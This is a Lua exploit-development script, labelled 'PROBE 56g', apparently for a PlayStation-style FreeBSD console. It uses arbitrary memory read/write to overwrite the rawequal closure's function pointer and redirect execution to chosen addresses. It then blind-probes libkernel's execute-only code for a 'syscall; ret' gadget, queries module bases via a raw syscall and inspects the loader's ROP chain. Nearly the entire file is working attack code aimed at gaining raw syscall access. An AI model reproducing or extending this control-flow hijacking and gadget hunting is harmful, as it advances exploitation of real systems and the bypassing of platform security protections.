-- CRASH_CLASS: MODERATE
-- PROBE 56g: Find and use syscall;ret gadget in libkernel
--
-- Context: 56e/56f proved reliable CClosure redirect with controlled
-- return values (65us/cycle, 100% reliable). We can dispatch to ANY
-- executable address.
--
-- Goal: Find "syscall; ret" (0F 05 C3) in libkernel's XO .text.
-- Can't read XO pages, but we can CALL through them via CClosure +0x20.
-- Strategy:
--   [A] Get libkernel base and size
--   [B] Try known FreeBSD syscall stub offsets (blind probe)
--       On FreeBSD, the raw __syscall is typically at a small offset.
--       We redirect rawequal to candidate addresses and try calling it
--       with getpid args (syscall 20). If we get our PID back, we found it.
--   [C] Also probe libSceLibcInternal for syscall gadgets
--   [D] Test: can we call make_syscall's underlying C handler directly?
--       The loader must have a C function that does the actual syscall.
--       If we find its address, we can redirect any CClosure to it.

print("=== PROBE 56g: SYSCALL GADGET HUNT ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end

local function parse_func_addr(fn)
    local s = tostring(fn)
    local hex = s:match("0x([0-9a-fA-F]+)")
    if not hex then hex = s:match(":%s*([0-9a-fA-F]+)%s*$") end
    if not hex then hex = s:match("([0-9a-fA-F][0-9a-fA-F][0-9a-fA-F]+)") end
    if hex then return uint64("0x" .. hex) end
    return nil
end

local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end

-- ============================================================
-- [A] Get module bases
-- ============================================================
print("[A] Module bases")

local function get_module_info(handle)
    local info = memory.alloc(0x200)
    safe_wd(info, 0x160)
    local sc = make_syscall(593)
    local ok = pcall(function() sc(uint64(handle), info) end)
    if not ok then return nil end
    local text_lo = safe_rd(info + 0x108)
    local text_hi = safe_rd(info + 0x10C)
    local text_sz_lo = safe_rd(info + 0x110)
    local text_sz_hi = safe_rd(info + 0x114)
    local data_lo = safe_rd(info + 0x148)
    local data_hi = safe_rd(info + 0x14C)
    return {
        text_base = uint64(string.format("0x%X%08X", text_hi or 0, text_lo or 0)),
        text_size = uint64(string.format("0x%X%08X", text_sz_hi or 0, text_sz_lo or 0)),
        data_base = uint64(string.format("0x%X%08X", data_hi or 0, data_lo or 0)),
        text_lo = text_lo, text_hi = text_hi,
        text_sz_lo = text_sz_lo,
    }
end

-- Handle 0 = eboot
local eboot = get_module_info(0)
-- Handle 0x2001 = libkernel (standard handle)
local libkernel = get_module_info(0x2001)

print("  eboot text:     " .. hexval(eboot and eboot.text_base))
print("  eboot text sz:  " .. hexval(eboot and eboot.text_size))
print("  libkernel text: " .. hexval(libkernel and libkernel.text_base))
print("  libkernel text sz: " .. hexval(libkernel and libkernel.text_size))

if not libkernel then
    print("ABORT: can't get libkernel info")
    return
end

local rawequal_addr = parse_func_addr(rawequal)
print("  rawequal:       " .. hexval(rawequal_addr))

-- Save originals
local rawequal_20_lo = safe_rd(rawequal_addr + 0x20)
local rawequal_20_hi = safe_rd(rawequal_addr + 0x24)

-- Get our PID for verification
local sc_getpid = make_syscall(20)
local our_pid = to_num(sc_getpid())
print("  our PID: " .. our_pid)

collectgarbage("stop")

-- ============================================================
-- [B] Examine the loader's make_syscall C implementation
-- The syscall.pipe object has a metatable with __call.
-- That __call handler is a C function that does the actual syscall.
-- Find its address and +0x20 target.
-- ============================================================
print("")
print("[B] Loader's syscall dispatch")
local pipe_mt = getmetatable(syscall.pipe)
if pipe_mt then
    print("  pipe metatable found")
    local call_fn = pipe_mt.__call
    if call_fn then
        local call_addr = parse_func_addr(call_fn)
        print("  __call addr: " .. hexval(call_addr))
        if call_addr then
            local call_20 = safe_rq(call_addr + 0x20)
            print("  __call +0x20: " .. hexval(call_20))
            -- This is the C function that implements syscall dispatch!
            -- If we redirect rawequal to this, rawequal becomes a syscall invoker
        end
    else
        print("  no __call in metatable")
        -- Dump metatable contents
        for k, v in pairs(pipe_mt) do
            print("    mt." .. tostring(k) .. " = " .. tostring(v))
        end
    end
else
    print("  no metatable on syscall.pipe")
end

-- Also check: what's in the syscall.pipe object itself?
print("")
print("  syscall.pipe contents:")
local pipe_str = tostring(syscall.pipe)
print("  tostring: " .. pipe_str)
for k, v in pairs(syscall.pipe) do
    if type(k) == "string" then
        print("    ." .. k .. " = " .. tostring(v))
    end
end

-- ============================================================
-- [C] Try to find the C function that does raw syscall
-- Parse the known fields from the pipe object
-- ============================================================
print("")
print("[C] Pipe object deep inspection")
local fn_addr_str = pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
local rop_addr_str = pipe_str:match("ropchain @ (0x[0-9a-fA-F]+)")
if fn_addr_str then
    print("  fn_addr: " .. fn_addr_str)
    local fn_addr = uint64(fn_addr_str)
    -- Read what fn_addr points to
    local fn_target = safe_rq(fn_addr)
    print("  *fn_addr: " .. hexval(fn_target))
    -- Is this an eboot address? If so, it might be the syscall trampoline
    if fn_target then
        local fh, fl = get_hi_lo(fn_target)
        local eh, el = get_hi_lo(eboot.text_base)
        if fh == eh and fl >= el and fl < el + (eboot.text_sz_lo or 0) then
            print("  -> IN EBOOT .text (offset: 0x" .. string.format("%X", fl - el) .. ")")
        else
            print("  -> NOT in eboot .text")
        end
    end
end
if rop_addr_str then
    print("  rop chain: " .. rop_addr_str)
end

-- ============================================================
-- [D] Blind probe for syscall;ret in libkernel
-- FreeBSD amd64 syscall stubs follow a pattern:
--   mov rax, <syscall_num>  ; 48 C7 C0 XX XX XX XX (or B8 XX XX XX XX)
--   syscall                  ; 0F 05
--   ret                      ; C3
-- Or the raw __syscall helper which just does: syscall; ret
-- Common offsets on FreeBSD: try every 0x10 in first 0x1000
-- We test by redirecting rawequal +0x20 to the candidate and
-- calling it. If it's a syscall;ret, rax determines syscall number.
-- Since rax will be whatever the C caller left, this is risky.
-- Safer: redirect to address, wrap in pcall, check for crash.
-- ============================================================
print("")
print("[D] Blind probe for callable code in libkernel")
local lk_hi, lk_lo = get_hi_lo(libkernel.text_base)
local lk_sz = libkernel.text_sz_lo or 0x48000

-- We know the __call C function on syscall.pipe already does syscalls.
-- Instead of blind probing (risky), let's see if we can redirect
-- rawequal to the pipe's __call C function to gain raw syscall access.
-- The __call function expects: (lua_State* L) -> int
-- When called via rawequal's CClosure, L is passed correctly (same ABI).
-- But __call reads syscall_no from the pipe object's fields, not from
-- our rawequal object. So this won't directly work.
--
-- Better approach: find the actual syscall instruction address in
-- the pipe's __call C function by examining nearby executable code.

-- Let's try a few known offsets for libkernel __syscall
-- On PS4/PS5 FreeBSD, the raw syscall stub is often near the start
local candidates = {}
for off = 0, 0x1000, 0x10 do
    candidates[#candidates + 1] = off
end
-- Also try specific known PS4 offsets
for _, off in ipairs({0xB57, 0xB50, 0xB58, 0xB60, 0xB70, 0xB80}) do
    candidates[#candidates + 1] = off
end

print("  Testing " .. #candidates .. " libkernel offsets via pcall")
print("  (redirecting rawequal, calling with pcall, checking for non-crash)")

-- Use xor eax,eax;ret as our "safe" baseline for comparison
local eboot_hi2, eboot_lo2 = get_hi_lo(eboot.text_base)
local xor_lo = eboot_lo2 + 0x471
local xor_hi = eboot_hi2

local survived = {}
local crashed = {}

for _, off in ipairs(candidates) do
    local addr_lo = lk_lo + off
    local addr_hi = lk_hi
    if addr_lo >= 0x100000000 then
        addr_hi = addr_hi + 1
        addr_lo = addr_lo - 0x100000000
    end

    memory.write_dword(rawequal_addr + 0x20, addr_lo)
    memory.write_dword(rawequal_addr + 0x24, addr_hi)
    local ok, r1 = pcall(rawequal, 1, 1)
    -- Immediately restore
    memory.write_dword(rawequal_addr + 0x20, rawequal_20_lo)
    memory.write_dword(rawequal_addr + 0x24, rawequal_20_hi)

    if ok then
        survived[#survived + 1] = string.format("0x%04X ok r=%s", off, tostring(r1))
    else
        crashed[#crashed + 1] = string.format("0x%04X err=%s", off, tostring(r1))
    end
end

print("  Survived (" .. #survived .. "):")
for _, s in ipairs(survived) do
    print("    " .. s)
end
print("  Crashed (" .. #crashed .. "):")
for i = 1, math.min(20, #crashed) do
    print("    " .. crashed[i])
end
if #crashed > 20 then
    print("    ... and " .. (#crashed - 20) .. " more")
end

print("  verify rawequal(1,1) = " .. tostring(rawequal(1,1)))

collectgarbage("restart")

print("")
print("=== PROBE 56g COMPLETE ===")
